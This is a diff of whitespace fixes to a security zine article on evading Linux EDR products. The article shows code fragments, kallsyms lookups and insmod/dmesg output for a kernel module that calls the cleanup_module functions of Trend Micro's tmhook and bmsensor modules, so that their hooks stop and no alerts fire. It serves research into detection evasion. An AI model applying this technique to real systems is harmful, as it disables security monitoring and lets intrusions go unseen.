@@ -17,9 +17,9 @@ License:
 root@malware:~# insmod unhook.ko
 root@malware:~# dmesg
 [ 1337.001337]
-[ 1337.001337]  
+[ 1337.001337]
 [ 1337.001337]  Unhooking Linux EDRs
-[ 1337.001337]     
+[ 1337.001337]
 [ 1337.001337]
 root@malware:~#
 
@@ -33,20 +33,20 @@ root@malware:~#
 --[ 1 ]----------------------------------------------------[ Introduction ]-----
 
 Linux security has always been a subject of great interest to me, especially
-when it comes to detecting and mitigating threats at the kernel level. 
-I am constantly seeking to understand the mechanisms used for system 
-monitoring and protection, and this time, I have deepened my research in 
+when it comes to detecting and mitigating threats at the kernel level.
+I am constantly seeking to understand the mechanisms used for system
+monitoring and protection, and this time, I have deepened my research in
 EDRs (Endpoint Detection and Response) on Linux.
 
-Currently, various EDR solutions uses LKMs (Loadable Kernel Modules) 
-to system call hooking and implementing security mechanisms. For example, 
+Currently, various EDR solutions uses LKMs (Loadable Kernel Modules)
+to system call hooking and implementing security mechanisms. For example,
 Trend Micro Deep Security utilizes kernel modules for monitoring and protection,
-whereas CrowdStrike Falcon relies on eBPF (Extended Berkeley Packet Filter) 
+whereas CrowdStrike Falcon relies on eBPF (Extended Berkeley Packet Filter)
 and ML (Machine Learning).
 
-What caught my attention the most were EDRs that utilize LKMs. In this zine, 
-I will explore how we can manipulate these hooks removing hooks from a 
-specific LKM to prevent alert generation and potentially disable its 
+What caught my attention the most were EDRs that utilize LKMs. In this zine,
+I will explore how we can manipulate these hooks removing hooks from a
+specific LKM to prevent alert generation and potentially disable its
 protection mechanisms.
 
 --[ 2 ]----------------------[ Understanding how Kernel Module is removed ]-----
@@ -76,12 +76,12 @@ module_init(matheuz_init);
 module_exit(matheuz_exit);
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
-When the module is loaded, the kernel call matheuz_init(), logging 
-"Hello, @matheuz!" in the kernel log. Upon removal with rmmod, the kernel checks 
-if the module is in use (refcount), calls matheuz_exit(), logs "Bye, @matheuz!", 
+When the module is loaded, the kernel call matheuz_init(), logging
+"Hello, @matheuz!" in the kernel log. Upon removal with rmmod, the kernel checks
+if the module is in use (refcount), calls matheuz_exit(), logs "Bye, @matheuz!",
 and removes the LKM, making it disappear from /proc/modules and /sys/module/.
 
-Interestingly, the kernel creates an alias called cleanup_module, pointing 
+Interestingly, the kernel creates an alias called cleanup_module, pointing
 to matheuz_exit(), which can be verified through /proc/kallsyms:
 
 ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -95,9 +95,9 @@ to matheuz_exit(), which can be verified through /proc/kallsyms:
  cowboy@bebop:~$
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
-You might be wondering: why does this matter? After all, only root users 
-can remove modules using rmmod in specific, right? Wrong. Some security solutions, 
-such as Trend Micro's EDR, implement protections that prevent their kernel module 
+You might be wondering: why does this matter? After all, only root users
+can remove modules using rmmod in specific, right? Wrong. Some security solutions,
+such as Trend Micro's EDR, implement protections that prevent their kernel module
 from being removed even with root:
 
 ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -106,27 +106,27 @@ tmhook                143360  110 bmsensor
 root@edr:~# lsmod|grep bmsensor
 bmsensor              557056  2
 tmhook                143360  110 bmsensor
-root@edr:~# 
+root@edr:~#
 root@edr:~# rmmod -f bmsensor
 rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module() could
               not remove 'bmsensor': Resource temporarily unavailable
 rmmod: ERROR: could not remove module bmsensor: Resource temporarily unavailable
-root@edr:~# 
+root@edr:~#
 root@edr:~# rmmod -f tmhook
 rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module() could
               not remove 'tmhook': Resource temporarily unavailable
 rmmod: ERROR: could not remove module tmhook: Resource temporarily unavailable
-root@edr:~# 
-root@edr:~# 
+root@edr:~#
+root@edr:~#
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
-But what if, instead of using rmmod, we directly calls the module's 
+But what if, instead of using rmmod, we directly calls the module's
 cleanup_module function, bypassing these restrictions?
 
 --[ 3 ]--------------------------------------------------[ Unhooking EDR  ]-----
 
 Since rmmod is not a viable option, we can bypass this limitation by directly
-calls the module's cleanup_module function. But how is this possible? The answer 
+calls the module's cleanup_module function. But how is this possible? The answer
 is simple: by creating an LKM that have the function's address and calls it.
 
 In other words, if we find cleanup_module through /proc/kallsyms and call it,
@@ -141,7 +141,7 @@ we can disable the module's hooks without actually removing it from memory.
 
 struct module_entry {
     struct list_head list;
-    char *name; 
+    char *name;
     void *address;
 };
 
@@ -195,7 +195,7 @@ entry contains the name and address of a function specifically, cleanup_module
 from the tmhook module.
 
 It then adds an entry for cleanup_module with its corresponding address and
-calls the function magick_lol(), which searches for this entry in the list. 
+calls the function magick_lol(), which searches for this entry in the list.
 If found, it calls the associated function.
 
 Once the LKM is loaded, you can check the kernel logs with dmesg to confirm
@@ -208,7 +208,7 @@ but its hooks are no longer active.
 ╔══════════════════════════════════════════════════════════════════════════════╗
 root@edr:~# lsmod|grep tmhook
 tmhook                143360  110 bmsensor
-root@edr:~# 
+root@edr:~#
 root@edr:~# dmesg|grep tmhook
 [   24.211040] tmhook: loading out-of-tree module taints kernel.
 [   24.211046] tmhook: tainting kernel with TAINT_LIVEPATCH
@@ -222,16 +222,16 @@ root@edr:~# dmesg|grep tmhook
 [   24.397248] livepatch: 'tmhook': starting patching transition
 [   24.445418] tmhook: tmhook 1.2.2049 loaded
 [   41.049805] livepatch: 'tmhook': patching complete
-root@edr:~# 
+root@edr:~#
 root@edr:~# cat /proc/kallsyms|grep tmhook |grep -e cleanup_module
 ffffffffc08cdd50 d __UNIQUE_ID___addressable_cleanup_module319  [tmhook]
 ffffffffc08cb310 t cleanup_module [tmhook]
 ffffffffc08cb300 t __pfx_cleanup_module [tmhook]
-root@edr:~# 
+root@edr:~#
 root@edr:~# cat unhook.c|grep cleanup_mod
         if (strcmp(entry->name, "cleanup_module") == 0) {
     add_entry("cleanup_module", (void *)0xffffffffc08cb310); //call
-root@edr:~# 
+root@edr:~#
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
 Notice that the Trend Micro tmhook module is currently loaded. Now,
@@ -239,7 +239,7 @@ let's call its cleanup_module function.
 
 ╔══════════════════════════════════════════════════════════════════════════════╗
 root@edr:~# insmod unhook.ko
-root@edr:~# 
+root@edr:~#
 root@edr:~# dmesg|grep tmhook
 [   24.211040] tmhook: loading out-of-tree module taints kernel.
 [   24.211046] tmhook: tainting kernel with TAINT_LIVEPATCH
@@ -254,8 +254,8 @@ root@edr:~# dmesg|grep tmhook
 [   24.445418] tmhook: tmhook 1.2.2049 loaded
 [   41.049805] livepatch: 'tmhook': patching complete
 [ 1040.077852] tmhook: tmhook 1.2.2049 unloaded
-root@edr:~# 
-root@edr:~# 
+root@edr:~#
+root@edr:~#
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
 After loading our LKM that calls cleanup_module, check the dmesg logs,
@@ -268,12 +268,12 @@ root@edr:~# cat /proc/kallsyms|grep bmsensor|grep -e cleanup_module
 ffffffffc0947ef0 d __UNIQUE_ID___addressable_cleanup_module502  [bmsensor]
 ffffffffc093b990 t cleanup_module [bmsensor]
 ffffffffc093b980 t __pfx_cleanup_module [bmsensor]
-root@edr:~# 
+root@edr:~#
 root@edr:~# cat unhook.c |grep 990
     add_entry("cleanup_module", (void *)0xffffffffc093b990); //call
-root@edr:~# 
+root@edr:~#
 root@edr:~# insmod unhook.ko
-root@edr:~# 
+root@edr:~#
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
 As a result, no alerts will be triggered, and none of Trend Micro's module
